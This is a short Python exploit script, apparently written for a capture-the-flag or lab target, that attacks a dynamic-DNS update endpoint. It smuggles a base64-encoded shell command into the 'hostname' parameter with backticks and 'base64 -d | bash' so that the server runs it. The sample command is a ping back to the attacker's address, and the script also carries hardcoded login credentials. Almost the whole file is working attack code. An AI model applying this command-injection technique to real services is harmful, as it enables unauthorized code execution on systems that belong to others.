#!/usr/bin/python3

import os,sys,re
import requests
from requests.auth import HTTPBasicAuth
from base64 import b64encode

#######################
##
##

url = 'http://dyna.HAXXX/nic/update'
payload = b'ping -c 4 <YOUR IP>'
final = b64encode(payload)
print ('{}'.format(final.decode()))
params = {
	'myip' : '<YOUR IP>',
	'hostname': '`echo "{}" | base64 -d | bash`"dynadns.no-ip.HAXXX'.format(final.decode()),
	'offline': 'YES'
}


res = requests.get(url, verify=False, auth=HTTPBasicAuth('asdfFdkasdflksdnfa', 'SDFldafknsdDFNnzzx'), params=params)
print (res.text)

##
##
#######################
##
